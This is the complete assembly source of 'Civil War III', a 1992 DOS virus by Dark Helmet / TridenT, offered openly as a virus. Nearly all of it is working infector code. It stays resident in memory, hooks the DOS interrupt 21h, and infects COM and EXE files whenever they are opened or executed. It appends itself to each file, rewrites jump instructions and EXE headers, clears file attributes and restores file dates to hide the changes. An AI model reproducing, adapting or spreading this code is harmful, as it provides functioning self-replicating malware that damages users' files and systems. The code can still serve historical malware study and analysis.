;****************************************************************************
;  Civil War III,  							    *
;                                                			    *
;  Assembled with Tasm 2.5                                		    *
;  (c) 1992 Dark Helmet / TridenT, The Netherlands                   	    *
;  The author takes no responsibility for any damaged caused by this virus  *
;									    *
;****************************************************************************
;									    *
;   Civil War...							    *
;									    *
;   "For all I've seen has change my mind                       	    *
;    But still the wars go on as the years go by                	    *
;    With no love for God or human rights                       	    *
;    'Cause all these dreams are swept aside                    	    *
;    By bloody hands of the hypnotized					    *
;    Who carry the cross of homicide                            	    *
;    And history bears the scars of our civil war"              	    *
;                                                			    *
;****************************************************************************


          	.Radix 16
Civ_War	 	Segment
		Model  small
          	Assume cs:Civ_War, ds:Civ_War, es:Civ_War

          	org 100h

lenght       	equ offset last - start
virus_lenght	equ lenght /16d

;******************************************************************************
;
;		A dummy file created only for the virus dropper
;
;******************************************************************************

dummy:         	db 0e9h, 00h, 00h 		   	; Jump + infection
		                                  	; marker

;******************************************************************************
;
;			Here starts the virus code
;
;******************************************************************************

start:         	call 	start_2              		; Make call to
                		                   	; push IP on stack.
start_2:	pop 	bp				; Get IP from stack.
		sub 	bp, offset start_2

check_host:	cmp 	cs:[host_file+bp],0Ch		; Check if the host 
							; file is a COM file.
		jne 	exe_start			; Host file is an
							; EXE file.

com_start:	mov	di,0100h			; Restore beginning 
		lea	si,cs:[host_begin+bp]	        ; of the host file
		mov	cx,03h				; (first 6 bytes).
		rep	movsb	

		push	cs				; New CS on stack.
		mov	ax,0100h			; New IP on stack.
		push	ax
		jmp	chk_install
		
exe_start:	mov	ax,cs:[old_cs+bp]		; Calculate new
		mov	bx,ax				; CS
		mov	ax,ds
		add	ax,bx
		add	ax,10h
		push	ax				; New CS on stack.
		mov	ax,cs:[old_ip+bp]			
		push	ax 				; New IP on stack.
 
                
chk_install:  	
		push	ds
		push	es
		
		mov	ah,0a0h			       ; check if virus already	
		int	21h			       ; resident	
		cmp	ax,0003h		       ; check for virus_id	
		je	abort

adjust_memory:	push	ds				; lower DS with 1
		pop	ax				; paragraf
		dec	ax
		push	ax
		pop	ds
		cmp	byte ptr ds:[0000],5a		; Check if last MCB.
		jne	abort				; If not last MCB end.

		mov	ax,ds:[0003]			; decrease memory size
		sub	ax,50h				; by about 1k	 
		mov	ds:[0003],ax	
		
		sub	word ptr ds:[0012],50h		
		
install_virus:  mov	bx,ax				; virus destination.
		mov	ax,es
		add	ax,bx
		mov	es,ax
		mov	cs:[v_segment+bp],es		; save virus segment
							; for hooking interrupt
		push	cs				; DS points to segment
		pop	ds				; with virus

		mov	cx,lenght			; Virus lenght.
		lea	si,[start+bp]			; Start of virus.	
		lea	di,es:0103h			; Where to copy virus
							; to.
		rep	movsb				; move virus to 
							; new memory location.

hook_int21:	cli				        ; hook int21h
		mov	ax,3521h			; get old int 21h
		int	21h				; vector
		mov	ds,cs:[v_segment+bp]
		mov	ds:[old_21h],bx			; old vector in memory
		mov	ds:[old_21h+2],es			

		mov	ax,ds				; INT 21, AX 2521
		mov	bx,ax				; bx segment new int21
		mov	dx, offset main_virus	        ; dx offset new int21
		xor	ax,ax
		mov	ds,ax
		mov	ds:[4*21h],dx			; offset int 21h
		mov	ds:[4*21h+2],bx			; seggment int 21h

		sti

abort:  	pop	es
		pop	ds
		retf					; continu with orginal
							; programming


;******************************************************************************
;
;           This part of the virus will intercept the interuptvectors
;
;******************************************************************************


main_virus:	
		pushf
		cmp	ah,0a0h				; check if virus ask
		jne	new_21h				; for virus_id
		mov	ax,0003h			; returns virus_id
		popf
		iret

new_21h:	push	ax
		push	bx
		push	cx
		push	dx
		push	ds
		push	es
		push	di
		push	sp
		push	bp
		
chk_open:	cmp	ah,3dh				; check if a file is
		je	chk_com				; opened

chk_exec:	cmp	ax,4b00h			; check if a file is
		je	chk_com				; executed

continu:	pop	bp
		pop	sp
		pop	di
		pop	es				; recover registers
		pop	ds
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		popf
		jmp	dword ptr cs:[old_21h]

;******************************************************************************




chk_com:	mov	cs:[name_seg],ds		; ds:dx = filename
		mov	cs:[name_off],dx
		
							; check if extension
		cld					; is .COM
		mov	di,dx
		push	ds
		pop	es
		mov	al,'.'
		repne	scasb
		cmp	word ptr es:[di],'OC'
		jne	chk_exe
		cmp	byte ptr es:[di+2],'M'
		jne	continu
		
		jmp	infect_com

chk_exe:	cmp	word ptr es:[di],'XE'		; check if extension
		jne	continu				; is .EXE
		cmp	byte ptr es:[di+2],'E'
		jne	continu

;******************************************************************************
;
;		This part will infect a EXE file
;
;******************************************************************************

infect_exe:	mov	cs:[host_file],0Eh		; EXE marker
		call	int24h
		call	open_file			; open file 
		jc	close_file			; Error?
		call	set_atributes
		call	get_date			; get file date/time
                call    chk_infect                      ; check if already
							; infect

                je      close_file

		mov	ax,4200h			; go to filestart
		call	mov_point	
		mov	ah,3fh				; read exe header
		mov	cx,18h
		lea	dx,[head_buffer]		; store header in
		call	do_int21h			; HEAD_BUFFER

                call    EXE_inf                         ; call for infection
                                                        ; of EXE file

		call	save_date
		jmp	close_file

;******************************************************************************
;
;		        This part will infect COM files
;
;******************************************************************************

infect_com:     mov     cs:[host_file],0Ch              ; COM marker
		call	int24h
		call	open_file			; open file
                jc      close_file                      ; error?
		call	set_atributes
		call	get_date			; get file date/time
		call	chk_infect			; check if already
							; infect

		

                je      close_file			; already infected

		mov	ax,4200h			; get beginning of file
		call	mov_point

		mov	ah,3fh
		mov	cx,03h
		push	cs
		pop	ds
		lea	dx,[host_begin]
		call	do_int21h
		

		mov	ax,4200h			; get file lenght
		call	mov_point

                mov     ax,4202h
		call	mov_point
		sub	ax,03h				; subtract 3 bytes for
		mov	cs:[lenght_file],ax		; jump instruction
							; later

		call	write_jmp			; write jmp instruction
		call	write_vir 			; write virus
		call	save_date

close_file:	mov	bx,cs:[handle]			; close file
		mov	ah,3eh
		call	do_int21h

restore_int24h:	mov	dx,cs:[old_24h]			; restore int 24h	
		mov	ds,cs:[old_24h+2]
		mov	ax,2524h
		call	do_int21h
		jmp	continu				; continu with 
							; interrupt

new_24h:	mov	al,3
		iret

;******************************************************************************
;
;			Procedure's used in the virus
;
;******************************************************************************

int24h:		push	cs
		pop	ds
		mov	ax,3524h			; hook int24h
		call	do_int21h
		mov	cs:[old_24h],bx
		mov	cs:[old_24h+2],es
		mov	dx,offset new_24h
		mov	ax,2524h
		call	do_int21h
		ret

set_atributes:  mov	ax,4300h			; clear file 
		mov	ds,cs:[name_seg]		; atributes
		mov	dx,cs:[name_off]
		call	do_int21h
		and	cl,0feh
		mov	ax,4301h
		call	do_int21h
		ret

get_date:	mov	ax,5700h			; get original			
		call	do_int21h			; time and date
		mov	cs:[date],dx			; of file	
		mov	cs:[time],cx
		ret

save_date: 	mov	bx,cs:[handle]
		mov	dx,cs:[date]
		mov	cx,cs:[time]
		mov	ax,5701h
		call 	do_int21h
		ret

open_file: 	mov	ds,cs:[name_seg]		; open file
		mov	dx,cs:[name_off]		; with pointer to
		mov	ax,3d02h			; name in ds:dx
		call	do_int21h
		mov	cs:[handle],ax
		mov	bx,ax	
		ret

chk_infect:	push	cs
		pop	ds
		mov	ax,4202h			; file-pointer
		xor	cx,cx				; to infection marker
		sub	cx,01h
		xor	dx,dx
		sub	dx,02h
		mov	bx,[handle]
		call	do_int21h

		mov	ah,3f
		mov	cx,02h
		lea	dx,[file_id]		
		call	do_int21h
                
		mov     al, byte ptr cs:[file_id]
		mov	ah, byte ptr cs:[file_id]+1
		cmp	ax,[id_marker]
		ret

		
mov_point:	push	cs
		pop	ds
		mov	bx,cs:[handle]			; move filepointer
		xor	cx,cx				
		xor	dx,dx
		call	cs:do_int21h
		ret


write_jmp:	push	cs
		pop	ds
		mov	ax,4200h			; write JUMP 
		call	mov_point			; instruction
		mov	ah,40h				; at begin of file
		mov	cx,01h
		lea	dx,cs:[jump]
		call	do_int21h
		
		mov	ah,40h				; write offset
		mov	cx,02h				; for JUMP
		lea	dx,cs:[lenght_file]
		call	do_int21h
		ret

write_vir:	push	cs
		pop	ds
		mov	ax,4202h			; write actual
		call	mov_point			; virus at end of 
		mov	ah,40h				; file
		mov	cx,lenght
		mov	dx,103h
		call	do_int21h
		ret

EXE_inf:        mov     ax,word ptr cs:[head_buffer+14h] ; store old IP
		mov	cs:[old_ip],ax
		mov	ax,word ptr cs:[head_buffer+16h] ; store old CS
		mov	cs:[old_cs],ax

new_CS_IP:      mov     ax,4200h                        ; get filelenght
		call	mov_point
		mov	ax,4202h			 
		call	mov_point
		mov	bx,10h				; divide filelenght
		div	bx                		; by 16
		sub	ax,word ptr cs:[head_buffer+08h]
		mov	cs:[new_cs],ax			; store new CS
		mov	cs:[new_ip],dx			; store new IP	
                call    write_vir                       ; write virus to end
							; of file
new_size:       mov     ax,4200h                        ; Get new filesize
		call    mov_point			; and calculate 
		mov	ax,4202h			; PAGE and OFFSET
		call    mov_point			; size for in the 
		mov	bx,0200h			; EXE buffer.
		div	bx
		cmp	dx,0000h
		jne	niet_nul
		jmp	doorgaan
niet_nul:	inc	ax
doorgaan:	mov	word ptr cs:[head_buffer+02h],dx ; new mod lengh
		mov	word ptr cs:[head_buffer+04h],ax ; new page lenght
		mov	ax,cs:[new_ip]
		mov	word ptr cs:[head_buffer+14h],ax ; new IP
		mov	ax,cs:[new_cs]
		mov     word ptr cs:[head_buffer+16h],ax ; new CS

		mov	word ptr cs:[head_buffer+0E],ax  ; new SS
		mov	word ptr cs:[head_buffer+10],1000 ; new SP
		
		mov	ax,4200h
		call	mov_point
                mov     ah,40h                          ; write new
		mov	bx,cs:[handle]			; EXE header
		mov	cx,18h
		lea 	dx,cs:[head_buffer]
		call	do_int21h
                ret

do_int21h:      pushf
		call	dword ptr cs:[old_21h]
		ret

;******************************************************************************
;
;			          D A T A
;
;******************************************************************************

v_name		db	"Civil War III v1.0, (c) Dec 1992, [ DH / TridenT] "
old_21h		dw	00h,00h
old_24h		dw	00h,00h
host_file	db	0Ch
host_begin	db	90h,0cdh,20h
jump		db	0e9h
name_seg	dw	?
name_off	dw	?
v_segment	dw	?
handle		dw	?
lenght_file	dw	?
date		dw	?
time		dw	?
head_buffer	db	18 dup (?)
file_id		dw	0000
old_cs		dw	?
old_ip		dw	?
new_cs		dw	?
new_ip		dw	?
Id_Marker	dw	"GR"
last		dw	"GR"
civ_war		ends
		end	dummy
